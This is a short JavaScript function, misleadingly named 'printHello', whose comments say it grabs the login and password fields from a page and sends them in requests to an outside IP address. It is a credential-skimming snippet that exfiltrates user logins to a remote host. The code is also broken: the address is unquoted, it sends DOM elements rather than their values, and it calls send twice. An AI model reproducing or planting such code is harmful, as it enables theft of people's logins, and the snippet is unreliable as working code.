function printHello() {
	// grab the login and pass
	var uniq = document.getElementById('login');
	var password = document.getElementById('password');
    console.log(uniq, password);
	// send the login and pass as resquests
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "GET", 35.2.222.118:80, false ); // false for synchronous request
	xmlHttp.send(uniq);
	xmlHttp.send(password);
}

